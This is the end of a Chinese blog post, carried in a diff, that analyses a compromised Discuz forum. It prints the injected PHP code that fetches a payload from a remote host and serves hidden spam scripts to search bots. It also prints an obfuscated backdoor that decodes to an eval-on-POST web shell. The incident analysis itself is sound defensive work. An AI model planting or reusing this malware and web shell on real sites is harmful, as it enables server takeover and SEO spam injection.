+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">filename</span>,<span style="color: #ad7fa8; font-style: italic;">'r'</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">data</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fread(</span>$<span style="color: #eeeeec;">fp</span>,<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">filename</span>));
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">empty(</span>$<span style="color: #eeeeec;">data</span>)) {@<span style="color: #eeeeec; background-color: #2e3436;">unlink(</span>$<span style="color: #eeeeec;">filename</span>);<span style="color: #729fcf; font-weight: bold;">return</span>;}
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">dec0de(</span>$<span style="color: #eeeeec;">fileDir</span>,$<span style="color: #eeeeec;">data</span>);
+} <span style="color: #729fcf; font-weight: bold;">else</span> {
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">data</span>=<span style="color: #eeeeec; background-color: #2e3436;">getdata(</span><span style="color: #ad7fa8; font-style: italic;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_H</span><span style="text-decoration: underline;">OST']);</span>
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">filename</span>,<span style="color: #ad7fa8; font-style: italic;">'w'</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">fp</span>,$<span style="color: #eeeeec;">data</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">strlen(</span>$<span style="color: #eeeeec;">data</span>) &gt; <span style="color: #eeeeec; background-color: #2e3436;">1000</span>) {
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">dec0de(</span>$<span style="color: #eeeeec;">fileDir</span>,$<span style="color: #eeeeec;">data</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
+}}
+<span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #eeeeec; background-color: #2e3436;">in_array(</span>$<span style="color: #eeeeec;">IP</span>,$<span style="color: #eeeeec;">KIP</span>)){
+<span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">KBot</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">KBots</span>){<span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">stristr(</span>$<span style="color: #eeeeec;">Bot</span>,$<span style="color: #eeeeec;">KBots</span>)){
+<span style="color: #eeeeec; background-color: #2e3436;">show(</span>$<span style="color: #eeeeec;">fileDir</span>);
+}}<span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">Key</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">Keys</span>){
+<span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">stristr(</span>$<span style="color: #eeeeec;">Ref</span>,$<span style="color: #eeeeec;">Keys</span>)){
+<span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;";}}}      </span>
+</pre>
+
+</li>
+</ul>
+
+
+<p>     
+   上面代码的目的就是下载恶意代码并执行。  
+</p>
+</div>
+
+</div>
+
+<div id="outline-container-4" class="outline-3">
+<h3 id="sec-4">继续排查</h3>
+<div class="outline-text-3" id="text-4">
+
+
+<p>
+   将通过比较svn中的代码与现网的代码还发现了一个新的后门程序
+</p>
+<ul>
+<li><code>uc_client/control/class.php</code>
+</li>
+</ul>
+
+
+
+
+
+<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span> $<span style="color: #eeeeec;">mt</span>=<span style="color: #ad7fa8; font-style: italic;">"mFsKCleRfU"</span>; $<span style="color: #eeeeec;">ojj</span>=<span style="color: #ad7fa8; font-style: italic;">"IEBleldle"</span>; $<span style="color: #eeeeec;">hsa</span>=<span style="color: #ad7fa8; font-style: italic;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #eeeeec;">fnx</span>=<span style="color: #ad7fa8; font-style: italic;">"Ow=="</span>; $<span style="text-decoration: underline;">zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?&gt;</span>
+</pre>
+
+
+<ul>
+<li>解码后的结果
+
+
+
+
+<pre class="src src-php">@<span style="color: #eeeeec; background-color: #2e3436;">eval(</span>$<span style="color: #8ae234;">_POST</span>[<span style="color: #ad7fa8; font-style: italic;">'wen'</span>]);
+</pre>
+
+
+<p>   
+     上面的脚本可以注入任意的代码。
+</p></li>
+</ul>
+
+
+</div>
+
+</div>
+
+<div id="outline-container-5" class="outline-3">
+<h3 id="sec-5">总结</h3>
+<div class="outline-text-3" id="text-5">
+
+
+<p>   
+   这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，也不知道已经被恶意用户种下了这些后门。
+</p></div>
+</div>
+
+  </div>
+  
+  <footer class="article-footer">
+    <nav class="tag-cloud">
+      <ul>
+	<li class="label label-inverse small"><a href="../../../tags/discuz.html">discuz</a></li><li class="label label-inverse small"><a href="../../../tags/security.html">security</a></li><li class="label label-inverse small"><a href="../../../tags/web.html">web</a></li>
+      </ul>
+    </nav>
+    <span class="muted">
+      发布于 <time datetime="2014-04-01T21:38:00Z"> 2014-04-01 21:38</time>
+    </span>
+  </footer>
+  </div>
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+  var disqus_shortname = 'kankananblog'; // required: replace example with your forum shortname
+  var disqus_url = 'http://blog.kankanan.com/posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html';
+
+  /* * * DON'T EDIT BELOW THIS LINE * * */
+  (function() {
+  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+  dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+      </div>
+      <div id="sidebar" class="span3">
+        <h5>最新文章</h5>
+        <div id="recent-posts">
+          <ul>
+            <li><a href="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html">论坛被挂暗链问题分析与解决</a></li> <li><a href="../../../posts/2014/03/12_archlinux7f517edc63a553e34e0a51fa73b04e244e2aip.html">Archlinux网络接口上出现两个IP</a></li> <li><a href="../../../posts/2014/03/10_5f006e90987976ee7ba174067cfb7edfff1atrac.html">开源项目管理系统：trac</a></li> <li><a href="../../../index.html">python应用国际化：Babel</a></li> <li><a href="../../../posts/2014/03/07_centos-62e44e0b5b8988c5redmine.html">CentOS 6.4下安装redmine</a></li> <li><a href="../../../posts/2014/02/17_7f168bd15b8988c5redis.html">编译安装redis</a></li> <li><a href="../../../posts/2014/02/17_7f168bd15b8988c5node2ejs.html">编译安装node.js</a></li> <li><a href="../../../posts/2014/02/14_express2ejs4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97connect2esid.html">express.js中如何在第一次请求的响应中取得connect.sid</a></li> <li><a href="../../../posts/2013/12/26_linux4e0b51418bb8666e901a752862376267884c97008981root674396507684547d4ee4.html">linux下允许普通用户执行需要root权限的命令</a></li> <li><a href="../../../posts/2013/12/20_4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528shared5ffrom5fthis.html">为什么不能在构造函数中调用shared_from_this</a></li> 
+          </ul>
+        </div>
+	    <h5>标签</h5>
+        <div id="tags">
+	      <ul>
+  <li style="font-size: 220.00%;"><a href="../../../tags/archlinux.html">archlinux</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/babel.html">babel</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/bitbucket.html">bitbucket</a></li> <li style="font-size: 115.00%;"><a href="../../../tags/c.html">c</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/chosen.html">chosen</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/comet.html">comet</a></li> <li style="font-size: 115.00%;"><a href="../../../tags/cpp.html">cpp</a></li> <li style="font-size: 115.00%;"><a href="../../../tags/discuz.html">discuz</a></li> <li style="font-size: 115.00%;"><a href="../../../tags/emacs.html">emacs</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/english.html">english</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/fcitx.html">fcitx</a></li> <li style="font-size: 115.00%;"><a href="../../../tags/hash.html">hash</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/hg.html">hg</a></li> <li style="font-size: 115.00%;"><a href="../../../tags/http.html">http</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/jabber.html">jabber</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/jquery.html">jquery</a></li> <li style="font-size: 220.00%;"><a href="../../../tags/linux.html">linux</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/log4cxx.html">log4cxx</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/log4php.html">log4php</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/memcached.html">memcached</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/mongodb.html">mongodb</a></li> <li style="font-size: 150.00%;"><a href="../../../tags/mysql.html">mysql</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/network.html">network</a></li> <li style="font-size: 150.00%;"><a href="../../../tags/nginx.html">nginx</a></li> <li style="font-size: 185.00%;"><a href="../../../tags/node.html">node</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/o-blog.html">o-blog</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/openssl.html">openssl</a></li> <li style="font-size: 185.00%;"><a href="../../../tags/php.html">php</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/pomodoro.html">pomodoro</a></li> <li style="font-size: 220.00%;"><a href="../../../tags/python.html">python</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/qrcode.html">qrcode</a></li> <li style="font-size: 220.00%;"><a href="../../../tags/redis.html">redis</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/redmine.html">redmine</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/security.html">security</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/spdy.html">spdy</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/trac.html">trac</a></li> <li style="font-size: 185.00%;"><a href="../../../tags/web.html">web</a></li> 
+</ul>
+
+        </div>
+        <h5>最新评论</h5>
+        <div id="recent-comments">
+          <script src="http://kankananblog.disqus.com/recent_comments_widget.js?num_items=5&hide_avatars=0&avatar_size=32&excerpt_length=100" type="text/javascript"></script>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="footer">
+	<div class="copyright" style="text-align: center;">
+	  <p>
+版权所有 © 2011-2013 看看俺 – KanKanAn.com
+</p>
+	  <p>Powered by <a href="https://github.com/renard/o-blog">o-blog</a>.</p>
+	</div>
+  </div>
+</body>
+</html>
+
